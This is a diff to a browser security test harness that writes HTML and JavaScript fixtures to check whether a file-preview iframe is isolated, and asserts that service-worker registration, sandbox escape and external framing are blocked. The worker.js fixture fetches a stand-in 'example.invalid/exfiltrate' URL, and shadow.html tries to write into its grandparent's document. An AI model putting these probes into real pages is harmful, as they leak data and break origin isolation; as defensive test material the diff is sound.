@@ -176,6 +176,15 @@ worker.onerror = () => parent.postMessage({
   probe: "target-preview-worker",
   value: "blocked"
 }, "*");
+navigator.serviceWorker.register("worker.js", {scope: "./"})
+  .then(() => parent.postMessage({
+    probe: "target-preview-service-worker",
+    value: "registered"
+  }, "*"))
+  .catch(() => parent.postMessage({
+    probe: "target-preview-service-worker",
+    value: "blocked"
+  }, "*"));
 document.fonts.load("12px CanonicalProbe")
   .then(fonts => parent.postMessage({
     probe: "target-preview-font",
@@ -201,6 +210,20 @@ navigation.addEventListener("load", () => {
 });
 navigation.src = "navigate.html";
 document.body.append(navigation);
+const frameProbe = new URLSearchParams(location.search).get("frame_probe");
+if (frameProbe === "external") {
+  parent.parent.postMessage({
+    probe: "target-preview-external-frame",
+    value: "loaded"
+  }, "*");
+}
+const mainOrigin = location.ancestorOrigins?.[0]
+  || (document.referrer ? new URL(document.referrer).origin : "");
+if (mainOrigin) {
+  const absoluteNavigation = document.createElement("iframe");
+  absoluteNavigation.src = `${mainOrigin}/api/preview/canonical-browser/shadow.html`;
+  document.body.append(absoluteNavigation);
+}
 </script>
 """.strip(),
         encoding="utf-8",
@@ -214,7 +237,16 @@ document.body.append(navigation);
         encoding="utf-8",
     )
     (ops / "site" / "worker.js").write_text(
-        "postMessage('loaded');",
+        """
+fetch("data.json")
+  .then(response => response.json())
+  .then(value => {
+    if (value.source !== "canonical") throw new Error("wrong Area");
+    return fetch("https://example.invalid/exfiltrate");
+  })
+  .then(() => postMessage("exfiltrated"))
+  .catch(() => postMessage("loaded"));
+""".strip(),
         encoding="utf-8",
     )
     font_source = next(
@@ -239,6 +271,22 @@ document.body.append(navigation);
         """
 <script>
 location = "../../../../../../../../../../api/preview/canonical-browser/brief.md";
+</script>
+""".strip(),
+        encoding="utf-8",
+    )
+    (container / "shadow.html").write_text(
+        """
+<script>
+let value = "isolated";
+try {
+  parent.parent.document.body.dataset.previewEscape = "true";
+  value = "escaped";
+} catch {}
+parent.parent.postMessage({
+  probe: "target-preview-absolute-navigation",
+  value
+}, "*");
 </script>
 """.strip(),
         encoding="utf-8",
@@ -336,6 +384,22 @@ def _browser_expression() -> str:
   };
   const exactButton = label => [...document.querySelectorAll("button")]
     .find(node => (node.textContent || "").trim() === label);
+  const rawTargetLoads = [];
+  const nativeFetch = window.fetch.bind(window);
+  window.fetch = (input, init) => {
+    const url = typeof input === "string" ? input : input.url;
+    if (url.includes("/raw?target=")) rawTargetLoads.push(url);
+    return nativeFetch(input, init);
+  };
+  const downloads = [];
+  const nativeAnchorClick = HTMLAnchorElement.prototype.click;
+  HTMLAnchorElement.prototype.click = function () {
+    if (this.download) {
+      downloads.push({href: this.href, name: this.download});
+      return;
+    }
+    return nativeAnchorClick.call(this);
+  };
   const jsonFetch = async path => {
     const response = await fetch(path);
     const body = await response.json();
@@ -477,6 +541,37 @@ def _browser_expression() -> str:
   }
   checks.push("design-scene-image-target");
 
+  const designNav = await until("Design navigation", () => exactButton("Design"));
+  designNav.click();
+  const galleryLink = await until("Design gallery link", () =>
+    [...document.querySelectorAll("button")]
+      .find(node => (node.textContent || "").includes("Your designs (1)"))
+  );
+  galleryLink.click();
+  const designCard = await until("Canonical Design card", () =>
+    [...document.querySelectorAll(".ds-gallery-grid .ds-tpl")]
+      .find(node => (node.querySelector(".ds-tpl-title")?.textContent || "").trim() === "Canonical visual")
+  );
+  designCard.click();
+  await until("canonical Design image byte load", () =>
+    rawTargetLoads.some(url =>
+      url.includes(encodeURIComponent('"path":"visual.png"'))
+      || decodeURIComponent(url).includes('"path":"visual.png"')
+    )
+  );
+  const exportButton = await until("Design export menu", () => exactButton("Export ▾"));
+  exportButton.click();
+  const htmlExport = await until("Design HTML export", () => exactButton("HTML"));
+  htmlExport.click();
+  const exported = await until("Design HTML download", () =>
+    downloads.find(item => item.name.endsWith(".html"))
+  );
+  const exportedHtml = await (await nativeFetch(exported.href)).text();
+  if (!exportedHtml.includes("data:image/png;base64,")) {
+    throw new Error("Design HTML export did not inline canonical image bytes");
+  }
+  checks.push("design-canvas-and-export-canonical-image-bytes");
+
   const legacyTree = await jsonFetch("/api/projects/legacy-browser/tree?path=");
   const legacyEntry = legacyTree.entries.find(entry => entry.name === "legacy.md");
   if (!legacyEntry?.target || legacyEntry.target.area.kind !== "ops") {
@@ -558,7 +653,7 @@ def _browser_expression() -> str:
         const frame = overlay.querySelector("iframe.av-frame");
         return frame?.src.includes("/api/target-preview/")
           && frame.src.includes("/ops/")
-          && frame.getAttribute("sandbox") === "allow-scripts allow-same-origin";
+          && !frame.hasAttribute("sandbox");
       });
       await until(`${name} targeted stylesheet load`, () =>
         previewMessages["target-preview-css"] === "loaded"
@@ -582,6 +677,13 @@ def _browser_expression() -> str:
           throw new Error(`${probe} failed inside the Area-bound origin: ${result}`);
         }
       }
+      const serviceWorker = await until(
+        `${name} service worker rejection`,
+        () => previewMessages["target-preview-service-worker"]
+      );
+      if (serviceWorker !== "blocked") {
+        throw new Error("targeted HTML registered a persistent Service Worker");
+      }
       const navigationResult = await until(
         `${name} scripted self-navigation`,
         () => previewMessages["target-preview-navigation"]
@@ -590,6 +692,21 @@ def _browser_expression() -> str:
         throw new Error(
           `targeted HTML self-navigation escaped its Area origin: ${navigationResult}`
         );
+      }
+      await wait(750);
+      const absoluteNavigation =
+        previewMessages["target-preview-absolute-navigation"] || "blocked";
+      if (!["isolated", "blocked"].includes(absoluteNavigation)) {
+        throw new Error("targeted HTML executed active legacy content on Proxima");
+      }
+      const frame = overlay.querySelector("iframe.av-frame");
+      const wrapper = document.createElement("iframe");
+      wrapper.srcdoc = `<iframe src="${frame.src}?frame_probe=external"></iframe>`;
+      document.body.append(wrapper);
+      await wait(750);
+      wrapper.remove();
+      if (previewMessages["target-preview-external-frame"] === "loaded") {
+        throw new Error("an opaque external ancestor framed the Area preview");
       }
     } else {
       await until(`${name} PDF preview`, () => {
